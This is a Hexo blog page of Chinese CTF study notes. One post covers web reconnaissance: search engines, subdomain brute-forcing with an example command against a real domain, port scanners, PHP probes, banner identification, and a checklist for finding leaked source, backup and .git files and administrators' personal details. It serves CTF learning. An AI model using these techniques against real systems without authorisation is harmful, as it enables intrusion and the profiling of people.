<h3 id="2-5-积累"><a href="#2-5-积累" class="headerlink" title="2.5 积累"></a>2.5 积累</h3><p>php 中不需要括号的函数 </p>
<p>echo 111; </p>
<p>print 123; </p>
<p> die; </p>
<p>include “ “ </p>
<p> require “ “ </p>
<p> include_once “ “ </p>
<p>7require_once “ “ </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/19/web/" data-id="ckyliufbo0000pkv39r6x0qzd" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/18/web1/" class="article-date">
  <time datetime="2022-01-18T10:48:41.586Z" itemprop="datePublished">2022-01-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><h3 id="1-6搜索引擎"><a href="#1-6搜索引擎" class="headerlink" title="1.6搜索引擎"></a>1.6搜索引擎</h3><ul>
<li><p>Google 搜索引擎：可以搜索 数据库⽂件、SQL注⼊、配置信息、源代码泄露、未授权访问、robots.txt等敏感信息 </p>
</li>
<li><p>Shodan </p>
</li>
<li><p>Fofa </p>
</li>
<li><p>Zoomeye </p>
</li>
</ul>
<h3 id="1-7-⼦域名信息收集"><a href="#1-7-⼦域名信息收集" class="headerlink" title="1.7 ⼦域名信息收集"></a>1.7 ⼦域名信息收集</h3><ul>
<li>⼦域名检测⼯具： </li>
</ul>
<p>Layer ⼦域名挖掘机 </p>
<p>subDomainsBrute 可爆破出三级四级甚⾄五级等不易被探测到的域名 </p>
<p>#实例：python subDomainsBrute.py csdn.net</p>
<p>Sublist3r </p>
<p>wydomain <a target="_blank" rel="noopener" href="https://github.com/ring04h/wydomain">https://github.com/ring04h/wydomain</a>  </p>
<ul>
<li>在线⽹址： </li>
</ul>
<p>⼦域名爆破⽹站 <a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> </p>
<p>IP反查绑定域名⽹站 </p>
<p><a target="_blank" rel="noopener" href="https://dns.aizhan.com/">https://dns.aizhan.com/</a> </p>
<p><a target="_blank" rel="noopener" href="https://site.ip138.com/">https://site.ip138.com</a> </p>
<p><a target="_blank" rel="noopener" href="http://dns.aizhan.com/">http://dns.aizhan.com/</a> </p>
<p><a target="_blank" rel="noopener" href="https://hackertarget.com/fifind-dns-host-records/">https://hackertarget.com/fifind-dns-host-records/</a> </p>
<p><a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </p>
<p><a target="_blank" rel="noopener" href="http://www.virustotal.com/">www.virustotal.com</a> </p>
<ul>
<li><p>证书透明度（CT）公开⽇志枚举</p>
<h3 id="1-8-收集端⼝信息"><a href="#1-8-收集端⼝信息" class="headerlink" title="1.8 收集端⼝信息"></a>1.8 收集端⼝信息</h3><ul>
<li>扫描⼯具： </li>
</ul>
<p> Nmap </p>
<p>Masscan </p>
<p>ZMap </p>
<p>御剑TCP端⼝扫描  </p>
</li>
</ul>
<h3 id="1-9-探针信息-flag-也可能存在的地方"><a href="#1-9-探针信息-flag-也可能存在的地方" class="headerlink" title="1.9 探针信息 (flag 也可能存在的地方)"></a>1.9 探针信息 (flag 也可能存在的地方)</h3><p>PHP 探针</p>
<p>含义：php探针 是⽤来探测空间、服务器运⾏状况和PHP信息⽤的，探针可以实时查看 服务器硬盘资源、内存占⽤、⽹卡流量、系统负载、服务器时间等信息。</p>
<p>常用的有四款php探针：<em>phpinfo</em>，<em>雅黑探针</em>，<em>UPUPW PHP探针</em>，<em>自建探针工具</em></p>
<p>题例： Web 16 </p>
<h3 id="1-10-Banner-识别"><a href="#1-10-Banner-识别" class="headerlink" title="1.10 Banner 识别"></a>1.10 Banner 识别</h3><p>Banner信息含义：即是该⽹站服务器对外现实的⼀些基础信息。 </p>
<p>搜集指纹库 </p>
<ul>
<li>GitHub 公开的 CMS 指纹库 </li>
</ul>
<p>⼯具使⽤ </p>
<ul>
<li>Wappalyzer </li>
</ul>
<p>技巧： </p>
<p>在⽹站上随意输⼊⼀些 URL，有时会通过 404 ⻚⾯或者是 302 跳转⻚⾯ 发现⼀些有⽤信息。 </p>
<ul>
<li><p>例如：开启了 Debug 选项的 ThinklPHP ⽹站会在⼀些错误提示⻚⾯显示 ThinkPHP 版本。 </p>
<h2 id="CTFSHOW总结："><a href="#CTFSHOW总结：" class="headerlink" title="CTFSHOW总结："></a>CTFSHOW总结：</h2><ul>
<li>第⼀步：查看 源代码 </li>
</ul>
<p>右键查看源代码 </p>
<p> F12 打开开发者⼯具 </p>
<p> Ctrl + U 查看源代码 </p>
<p>Burp 抓包查看 </p>
<ul>
<li><p>抓包 可能发现⼀些有⽤信息 </p>
</li>
<li><p>robots.txt </p>
</li>
<li><p>phps 源代码泄露 </p>
</li>
<li><p>下载源码⽂件、⽹站备份⽂件 </p>
</li>
<li><p>版本控制不要部署到⽣产环境中 .git .svn</p>
</li>
<li><p>Vim 缓存 .文件名.php.swp .文件名.php.swo .文件名.php.swn</p>
</li>
<li><p>cookie 的重要性 </p>
</li>
<li><p>域名、⼦域名 信息搜集 nslookup 在线网站</p>
</li>
<li><p>Banner 等公开信息 管理员密码 QQ QQ邮箱等 第三方软件查个人信息</p>
</li>
<li><p>技术⽂档 </p>
</li>
<li><p>对应编辑器漏洞 探针 </p>
</li>
<li><p>前端源码 密钥泄露 </p>
</li>
<li><p>db.mdb </p>
</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/18/web1/" data-id="ckyk0wved0000wkv33g1r3zon" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/01/28/SQL/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/01/26/web8/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/01/25/web7/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/01/24/web6/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/01/23/web5/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>